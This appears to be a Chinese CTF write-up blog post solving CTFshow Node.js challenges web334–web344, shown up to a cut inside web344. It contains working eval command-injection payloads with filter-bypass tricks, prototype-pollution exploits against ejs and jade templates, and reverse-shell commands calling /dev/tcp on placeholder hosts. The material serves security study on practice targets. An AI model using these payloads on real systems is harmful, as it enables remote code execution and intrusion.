        <content type="html"><![CDATA[<h1 id="题前准备"><a href="#题前准备" class="headerlink" title="题前准备"></a>题前准备</h1><p>简单了解下node.js，我对他的了解就是写过一点点的electron，然后就是老用npm来补网易云的一些插件XD。<br>语言特性了解：</p><blockquote><p> <a href="https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/">https://f1veseven.github.io/2022/04/03/ctf-nodejs-zhi-yi-xie-xiao-zhi-shi/</a></p></blockquote><p>后面几个重量级的暂时先学会利用，等语言熟悉了再跟着复现。</p><h1 id="web334"><a href="#web334" class="headerlink" title="web334"></a>web334</h1><h3 id="文件读取，rce拼接bypass"><a href="#文件读取，rce拼接bypass" class="headerlink" title="文件读取，rce拼接bypass"></a>文件读取，rce拼接bypass</h3><p>下载并解压相关代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = &#123;</span><br><span class="line">  <span class="attr">items</span>: [</span><br><span class="line">    &#123;<span class="attr">username</span>: <span class="string">&#x27;CTFSHOW&#x27;</span>, <span class="attr">password</span>: <span class="string">&#x27;123456&#x27;</span>&#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>尝试登录：<br>注意不要抄大写！登录之后就有flag了。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> users.<span class="title function_">find</span>(<span class="keyword">function</span>(<span class="params">item</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> name!==<span class="string">&#x27;CTFSHOW&#x27;</span> &amp;&amp; item.<span class="property">username</span> === name.<span class="title function_">toUpperCase</span>() &amp;&amp; item.<span class="property">password</span> === password;</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure><h1 id="web335"><a href="#web335" class="headerlink" title="web335"></a>web335</h1><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695202667462-f22c6299-16be-4c6a-a338-ed41039efa4b.png" alt="image.png"><br>传入之后发现是eval函数。传入1之后返回了1 。<br>这里找一找nodejs的危险函数：<br>child_process：<a href="">http://nodejs.cn/api/child_process.html</a><br><code>child_process.exec(command[, options][, callback])</code><br>命令执行：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>).<span class="title function_">execSync</span>(<span class="string">&#x27;ls&#x27;</span>);</span><br></pre></td></tr></table></figure><p>payload：<code>?eval=require(&#39;child_process&#39;).execSync(&#39;tac fl00*&#39;);</code></p><h1 id="web336"><a href="#web336" class="headerlink" title="web336"></a>web336</h1><p>加了过滤，过滤<code>exec</code>。<br>传入<code>__filename</code>读取文件位置，其他相关的变量：</p><ul><li>__filename - 当前 eval 代码运行的文件名</li><li>__dirname - 当前 eval 代码运行的文件夹路径</li><li>__line - 当前 eval 代码运行的行号</li><li>__column - 当前 eval 代码运行的列号</li></ul><p>当然知道位置了，就可以读取文件了：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>).<span class="title function_">readFileSync</span>(<span class="string">&#x27;/app/routes/index.js&#x27;</span>,<span class="string">&#x27;utf-8&#x27;</span>)</span><br></pre></td></tr></table></figure><p>jsbeautify一下方便阅读，发现过滤了exec和load两个关键字符</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>(); <span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> evalstring = req.<span class="property">query</span>.<span class="property">eval</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">typeof</span>(evalstring) == <span class="string">&#x27;string&#x27;</span> &amp;&amp; evalstring.<span class="title function_">search</span>(<span class="regexp">/exec|load/i</span>) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="string">&#x27;tql&#x27;</span></span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;</span><br><span class="line">            <span class="attr">title</span>: <span class="built_in">eval</span>(evalstring)</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>看了payload是通过拼接来达成运行的。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">require</span>(<span class="string">&quot;child_process&quot;</span>)[<span class="string">&#x27;exe&#x27;</span>%2b<span class="string">&#x27;cSync&#x27;</span>](<span class="string">&#x27;cat flag.txt&#x27;</span>)</span><br><span class="line"><span class="comment">//(%2b就是+的url编码)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;child_process&#x27;</span>)[<span class="string">&quot;exe&quot;</span>.<span class="title function_">concat</span>(<span class="string">&quot;cSync&quot;</span>)](<span class="string">&quot;open /System/Applications/Calculator.app/&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="web337"><a href="#web337" class="headerlink" title="web337"></a>web337</h1><p>源码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> router = express.<span class="title class_">Router</span>();</span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">md5</span>(<span class="params">s</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;md5&#x27;</span>)</span><br><span class="line">    .<span class="title function_">update</span>(s)</span><br><span class="line">    .<span class="title function_">digest</span>(<span class="string">&#x27;hex&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* GET home page. */</span></span><br><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> a = req.<span class="property">query</span>.<span class="property">a</span>;</span><br><span class="line">  <span class="keyword">var</span> b = req.<span class="property">query</span>.<span class="property">b</span>;</span><br><span class="line">  <span class="keyword">if</span>(a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>,&#123; <span class="attr">msg</span>: <span class="string">&#x27;tql&#x27;</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = router;</span><br></pre></td></tr></table></figure><p>js中有比较抽象的绕过md5方法：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a &amp;&amp; b &amp;&amp; a.<span class="property">length</span>===b.<span class="property">length</span> &amp;&amp; a!==b &amp;&amp; <span class="title function_">md5</span>(a+flag)===<span class="title function_">md5</span>(b+flag)</span><br></pre></td></tr></table></figure><p>a[x]=1&amp;b[x]=2，数组会被解析为<code>[object Object]</code><br>测试比如：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">a=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;1&#x27;</span>&#125;</span><br><span class="line">b=&#123;<span class="string">&#x27;x&#x27;</span>:<span class="string">&#x27;2&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">a=[<span class="number">1</span>]</span><br><span class="line">b=[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(b+<span class="string">&quot;flag&#123;xxx&#125;&quot;</span>)</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[object <span class="title class_">Object</span>]flag&#123;xxx&#125;</span><br><span class="line">[object <span class="title class_">Object</span>]flag&#123;xxx&#125;</span><br><span class="line">1flag&#123;xxx&#125;</span><br><span class="line">2flag&#123;xxx&#125;</span><br></pre></td></tr></table></figure><h1 id="web338"><a href="#web338" class="headerlink" title="web338"></a>web338</h1><blockquote><p><a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html#0x01-prototype__proto__</a></p></blockquote><h3 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h3><p>建议直接看上面的链接文章。讲的太好了，适合我这种菜狗。<br>这里就提一段代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">merge</span>(<span class="params">target, source</span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            <span class="title function_">merge</span>(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;a&quot;: 1, &quot;__proto__&quot;: &#123;&quot;b&quot;: 2&#125;&#125;&#x27;</span>)</span><br><span class="line"><span class="title function_">merge</span>(o1, o2)</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o1.<span class="property">a</span>, o1.<span class="property">b</span>)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(o3.<span class="property">b</span>)</span><br></pre></td></tr></table></figure><p>这段代码基本就可以介绍原型链相关内容。<br>比如说这道题的：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line"><span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===<span class="string">&#x27;36dboy&#x27;</span>)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>这里的secret就可以被原型链污染，具体在下面的<code>utils/commons</code>位置导致污染。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">copy</span>(<span class="params">object1, object2</span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> object2) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> object2 &amp;&amp; key <span class="keyword">in</span> object1) &#123;</span><br><span class="line">            <span class="title function_">copy</span>(object1[key], object2[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            object1[key] = object2[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure><p>这里达到了覆盖的效果。<br>我们传入payload测试一下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;ctfshow&quot;</span>:<span class="string">&quot;36dboy&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>注意，传入包的格式应该是：<code>application/json</code><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695215733351-c1f9a8f2-05df-4030-91aa-ab288c562189.png" alt="c6ae4a9fd8798a67b73a7fb0f6fc57ab.png"><br>但是这里我不知道为什么传入路由是<code>/login</code>而不是<code>/</code></p><h1 id="web339"><a href="#web339" class="headerlink" title="web339"></a>web339</h1><blockquote><p><a href="https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/#comments">https://evi0s.com/2019/08/30/expresslodashejs-%e4%bb%8e%e5%8e%9f%e5%9e%8b%e9%93%be%e6%b1%a1%e6%9f%93%e5%88%b0rce/#comments</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag=<span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">var</span> secert = &#123;&#125;;</span><br><span class="line">  <span class="keyword">var</span> sess = req.<span class="property">session</span>;</span><br><span class="line">  <span class="keyword">let</span> user = &#123;&#125;;</span><br><span class="line">  utils.<span class="title function_">copy</span>(user,req.<span class="property">body</span>);</span><br><span class="line">  <span class="comment">//console.log(user.query)</span></span><br><span class="line">  <span class="keyword">if</span>(secert.<span class="property">ctfshow</span>===flag)&#123;</span><br><span class="line">    res.<span class="title function_">end</span>(flag);</span><br><span class="line">  &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">json</span>(&#123;<span class="attr">ret_code</span>: <span class="number">2</span>, <span class="attr">ret_msg</span>: <span class="string">&#x27;登录失败&#x27;</span>+<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(user)&#125;);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>if(secert.ctfshow===flag)&#123;</code>这里已经没办法实现了<br>那就只能找别的地方了。<br>api.js中新增的内容：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* GET home page.  */</span></span><br><span class="line">router.<span class="title function_">post</span>(<span class="string">&#x27;/&#x27;</span>, <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>).<span class="title function_">json</span>(),<span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  res.<span class="title function_">render</span>(<span class="string">&#x27;api&#x27;</span>, &#123; <span class="attr">query</span>: <span class="title class_">Function</span>(query)(query)&#125;);</span><br><span class="line">   </span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这其中的query也是可以被操控的，比如：<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695216349714-0df19de3-93f3-4ed8-bd0a-026aa3f07205.png" alt="image.png"><br>用一下payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;query&quot;</span>:<span class="string">&quot;return global.process.mainModule.constructor._load(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/XXX/8888 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>先/login那里污染一下发包，然后再post访问一下/api即可。<br>loginPOST传入之后，再访问就成功弹shell。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695284336857-50eb569e-f316-46b2-a781-bbeabc05a2df.png" alt="image.png"><br>flag文件在routes下login.js中<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695284375860-b8fcdfdd-2e66-4fb3-86c3-1b6a3d8f8a9a.png" alt="image.png"></p><blockquote><p><strong>F</strong>unction环境下没有require函数，不能获得child_process模块，我们可以通过使用process.mainModule.constructor._load来代替require。</p></blockquote><h2 id="非预期"><a href="#非预期" class="headerlink" title="非预期"></a>非预期</h2><p>非预期的原因就是这题用了ejs模板引擎，这个模板引擎有个漏洞可以rce：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><h1 id="web340"><a href="#web340" class="headerlink" title="web340"></a>web340</h1><p>这段核心代码是：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">userinfo</span> = <span class="keyword">new</span> <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isVIP</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAdmin</span> = <span class="literal">false</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isAuthor</span> = <span class="literal">false</span>;     </span><br><span class="line">    &#125;;</span><br></pre></td></tr></table></figure><p>这里new了一个匿名函数并赋值给userinfo。this.userinfo的__proto__属性指向的是那个匿名函数的prototype属性:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">userinfo</span>.<span class="property">__proto__</span> === <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure><p>匿名函数的prototype属性又继承自Object.prototype:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> === <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span> </span><br></pre></td></tr></table></figure><p>因此：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">this</span>.<span class="property">userinfo</span>.<span class="property">__proto__</span> -&gt; <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;.<span class="property"><span class="keyword">prototype</span></span> -&gt; <span class="title class_">Object</span>.<span class="property"><span class="keyword">prototype</span></span></span><br></pre></td></tr></table></figure><p>因此需要套两层才能污染原型链。<br>payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xxx/xxx 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>污染+利用<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695285797030-12a2ab9e-87d7-403e-ab5a-f00ade9779f6.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695285850316-66cf92bb-d359-4df9-9b3d-a42c9ecf10ab.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695285843000-367e1043-ce79-497f-8bb7-8c713069a44e.png" alt="image.png"></p><h1 id="web341"><a href="#web341" class="headerlink" title="web341"></a>web341</h1><h3 id="ejs原型链污染"><a href="#ejs原型链污染" class="headerlink" title="ejs原型链污染"></a>ejs原型链污染</h3><p>payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;outputFunctionName&quot;</span>:<span class="string">&quot;_tmp1;global.process.mainModule.require(&#x27;child_process&#x27;).exec(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/111.11.111.111/11111 0&gt;&amp;1\&quot;&#x27;);var __tmp2&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>其中的_tmp1和tmp2是为了闭合代码。<br>还是先在login中post污染，然后访问/就可以接到shell。flag在根目录。</p><h1 id="web342-web343"><a href="#web342-web343" class="headerlink" title="**web342-web343"></a>**web342-web343</h1><blockquote><p><a href="https://xz.aliyun.com/t/7025">https://xz.aliyun.com/t/7025</a><br><a href="https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade">https://lonmar.cn/2021/02/22/%E5%87%A0%E4%B8%AAnode%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E7%9A%84%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%E5%88%86%E6%9E%90/#0x02-jade</a><br><a href="https://tari.moe/p/2021/ctfshow-nodejs#fee3a3930b854ee8b473db3cf3747056">https://tari.moe/p/2021/ctfshow-nodejs#fee3a3930b854ee8b473db3cf3747056</a></p></blockquote><h3 id="jade"><a href="#jade" class="headerlink" title="jade"></a>jade</h3><p>改用jade了，哈哈这wp我都看不懂，太抽象了。<br>省流一下，payload：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;__proto__&quot;</span>:&#123;<span class="string">&quot;type&quot;</span>:<span class="string">&quot;Code&quot;</span>,<span class="string">&quot;self&quot;</span>:<span class="number">1</span>,<span class="string">&quot;line&quot;</span>:<span class="string">&quot;global.process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xx/xx 0&gt;&amp;1\&quot;&#x27;)&quot;</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p>还是login污染，根目录激活。</p><h1 id="web344"><a href="#web344" class="headerlink" title="web344"></a>web344</h1><h3 id="HPP数据污染"><a href="#HPP数据污染" class="headerlink" title="HPP数据污染"></a>HPP数据污染</h3><blockquote><p><a href="https://www.cnblogs.com/AtesetEnginner/p/12375499.html">https://www.cnblogs.com/AtesetEnginner/p/12375499.html</a></p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">router.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res, next</span>) &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="string">&#x27;flag_here&#x27;</span>;</span><br><span class="line">  <span class="keyword">if</span>(req.<span class="property">url</span>.<span class="title function_">match</span>(<span class="regexp">/8c|2c|\,/ig</span>))&#123;</span><br><span class="line">  res.<span class="title function_">end</span>(<span class="string">&#x27;where is flag :)&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">var</span> query = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(req.<span class="property">query</span>.<span class="property">query</span>);</span><br><span class="line">  <span class="keyword">if</span>(query.<span class="property">name</span>===<span class="string">&#x27;admin&#x27;</span>&amp;&amp;query.<span class="property">password</span>===<span class="string">&#x27;ctfshow&#x27;</span>&amp;&amp;query.<span 